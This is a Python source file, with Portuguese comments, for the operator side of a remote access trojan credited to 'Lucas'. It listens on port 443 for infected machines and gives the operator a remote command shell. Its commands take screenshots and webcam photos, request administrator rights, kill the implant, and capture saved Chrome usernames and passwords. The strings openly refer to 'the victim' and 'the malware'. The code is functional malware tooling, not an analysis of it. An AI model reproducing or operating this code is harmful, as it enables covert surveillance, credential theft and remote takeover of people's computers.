import socket
import sys
import threading
import time
import os

def socketCreating():
    try:
        global host
        global port
        global server
        host = "0.0.0.0"
        port = 443
        server = socket.socket()
    except socket.error as msg:
        print("Erro na criacao do socket: "+str(msg))

def bindSocket():
    try:
        global host
        global port
        global server
        print("Escutando na porta: "+str(port))

        server.bind((host, port))
        server.listen(5)
    except socket.error as msg:
        print("Erro na escuta do socket: "+str(msg) + "\n" + "restart..")
        bindSocket()
    except KeyboardInterrupt:
        exit(1)

def acceptConnection():
    try:
        conn, address = server.accept()
        print("Conexao estabelesida com: " + address[0])
        return conn
    except:
        print("Erro ao aceitar a conexao")

def startShell(conn):
    commands(conn)

def commands(conn):
    inputs = 'Comando -> '
    while True:
        try:
            try:
                resp = conn.recv(2048)
            except:
                print("Erro resposta")

            try:
                print(str(resp.decode('utf8', 'ignore')))
            except:
                print("Erro resposta print")

            try:
                comando = input(inputs)
                if len(str.encode(comando)) > 0:
                    if comando == "/help":
                        help()
                        conn.send("\n".encode())
                    elif comando == "/banner":
                        banner()
                        conn.send("\n".encode())
                    elif comando == "/exit":
                        try:
                            conn.send(str.encode(comando))
                            print("\n\nO malware que infecto a vitima esta rodando em segundo plano")
                            break
                        except:
                            print("client falho ao sair do server")
                    elif comando == "/kill":
                        try:
                            conn.send(str.encode(comando))
                            print("\n\nO malware n√£o esta mas sendo executado na maquina da vitima")
                            break
                        except:
                            print("client falho ao matar o server")
                    elif comando == "/screenshot":
                        try:
                            getDown("screenshot.png","/screenshot","complete",comando,conn)
                        except:
                            print("[client]- Falho ao tira a screenshot")
                    elif comando == "/webcam":
                        try:
                            getDown("webcam.png","/webcam","complete",comando,conn)
                        except:
                            print("[client]- Falho ao tira a foto da webcam")
                    elif comando.lower() == "/sessioncap":
                        try:
                            getDown("logS.txt","/sessioncap","complete",comando.lower(),conn)
                        except:
                            print("[client]- Falho ao fazer a captura de sessao")
                    elif comando.lower() == "/getadmin":
                        conn.send(str.encode(comando))
                        resp = conn.recv(1024)
                        print(str(resp.decode('utf8', 'ignore')))
                    else:
                        conn.send(str.encode(comando))
                        try:
                            print(str(resp.decode('utf8', 'ignore')))
                        except:
                            print('[-] UTF8-decode')
                            print(str(resp.decode()))
                else:
                    conn.send(' '.encode())
            except KeyboardInterrupt:
                conn.send("/exit".encode())
                conn.close()
                break
            except Exception as error:
                print(error)
                print("Erro no commands")
        except KeyboardInterrupt:
            conn.close()
            break
        except Exception as error:
            print("[-] Conexao perdida...reiniciando porfavor aguarde..")
            conn.close()
            socketCreating()

def banner():
    print(' _______    _____    _____     ____  ')
    print('| ______|  /  _  \  |  __ \   / __ \ ')
    print('| |       |  / \  | | |  | | | /  \ |')
    print('| |____   | |   | | | |  | | | |  | |')
    print('| _____|  | |   | | | |  | | | |__| |')
    print('| |       | |   | | | |  | | |  __  |')
    print('| |       |  \_/  | | |__| | | |  | |')
    print('|_|        \_____/  |_____/  |_|  |_|\n\n')
    print('Feito por Lucas, Versao 0.3.5\n\n')

def help():
    print("========================= Comandos =========================")
    print("/help       = Este comando vai printar todos os comando possiveis de ultilizar")
    print("/banner     = Este comando vai printar o banner de nossa criacao")
    print("/exit       = Este comando vai fazer com que vc pare a conexao")
    print("/kill       = Este comando vai nao so para a conexao mais tambem a da vitima que esta rodando em segundo plano")
    print("/info       = Este comando vai te da informacoes sobre o computador da vitima")
    print("/ip         = Este comando vai te da o ip da vitima")
    print("/checkAdmin = Este Comando vai printar se sua shell possui ou nao o privilegio de administrador")
    print("/getAdmin   = Este Comando vai pedir a vitima para ter acesso ao administrador")
    print("/screenshot = Este Comando vai tira uma foto da tela do computador da vitima")
    print("/webcam     = Este Comando vai te permitir tira uma foto da o webcam da vitima")
    print("/sessionCap = Este Comando vai captura todas as senhas e usuers da vitima na qual ela logo e salvo, Browsers[Google Chrome], [!]Nao precisa do admin[!]")
    print("========================= Comandos =========================")

def getDown(file,com,Fval,comando,conn):
    while comando==com:
        print("criando....")
        if file == "screenshot.png":
            for i in range(0,100,1):
                if not os.path.isfile("screenshot{}.png".format(i)):
                    file = "screenshot{}.png".format(i)
                    break
        if file == "webcam.png":
            for i in range(0,100,1):
                if not os.path.isfile("webcam{}.png".format(i)):
                    file = "webcam{}.png".format(i)
                    break
        conn.send(str.encode(comando))
        print("executando")
        #f=open(file,"wb")
        #img=conn.recv(2048)#8024
        #f.write(img)
        #while not Fval in str(img):
        #    img=conn.recv(8024)
        #    print(str(img))
        #    f.write(img)
        #f.close()
        with open(file, "wb") as f:
            img = conn.recv(2048)
            f.write(img)
            while not(Fval in str(img)):
                img = conn.recv(2048)
                print(str(img))
                f.write(img)
        print("---------------------------/Hex-Code")
        print("\nSalvo com sucesso")
        break
    
def main():
    socketCreating()
    bindSocket()
    conn = acceptConnection()
    startShell(conn)

if __name__ == "__main__":
    banner()
    main()



















        
